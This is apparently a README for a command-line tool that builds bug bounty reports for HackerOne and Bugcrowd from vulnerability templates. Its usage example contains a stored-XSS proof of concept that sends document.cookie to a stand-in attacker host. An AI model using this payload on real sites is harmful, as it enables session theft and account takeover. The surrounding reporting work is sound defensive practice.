# Bug Bounty Report Template Generator

CLI tool to generate markdown bug bounty reports for **HackerOne** and **Bugcrowd** with reusable vulnerability templates and variable substitution.

## Features
- Inputs: CVE, description, impact, steps to reproduce, and more
- Generates markdown in both HackerOne and Bugcrowd formats
- Common vulnerability templates:
  - `xss`
  - `idor`
  - `sqli`
  - `auth_bypass`
  - `generic`
- Dynamic field substitution using `${field_name}`
- Exports report files and supports `--preview`
- Interactive mode for CLI workflows

## Project Structure
```
report_generator.py
templates/
  platforms/
    hackerone.md
    bugcrowd.md
  vuln_types/
    xss.md
    idor.md
    sqli.md
    auth_bypass.md
    generic.md
requirements.txt
```

## Install
```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

## Usage

### 1) Interactive mode
```bash
python report_generator.py --interactive --platform both --preview
```

### 2) Non-interactive mode
```bash
python report_generator.py \
  --platform both \
  --vuln-type xss \
  --cve CVE-2025-12345 \
  --title "Stored XSS in Profile Bio" \
  --target "app.example.com" \
  --severity High \
  --description "User-controlled bio is rendered without output encoding." \
  --impact "Account takeover via session theft is possible." \
  --steps "1. Login\n2. Set bio to payload\n3. Visit profile page as victim" \
  --poc "<script>fetch('https://attacker.tld?c='+document.cookie)</script>" \
  --remediation "Apply context-aware output encoding and CSP." \
  --reporter "@researcher" \
  --output-dir output \
  --preview
```

### 3) List available vuln templates
```bash
python report_generator.py --list-vuln-types
```

## Output
Generated reports are saved under `output/` by default:
- `hackerone_<target>_<title>.md`
- `bugcrowd_<target>_<title>.md`
